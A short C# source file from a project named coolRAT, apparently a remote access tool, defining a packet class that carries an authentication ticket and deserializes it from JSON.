using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class AuthenticateConnectionPacket : Packet
    {
        public string AuthenticationTicket;

        public AuthenticateConnectionPacket(string authTicket)
        {
            Type = "AuthenticateConnectionPacket";
            AuthenticationTicket = authTicket;
        }

        public new static AuthenticateConnectionPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<AuthenticateConnectionPacket>(packet_string);
        }
    }
}
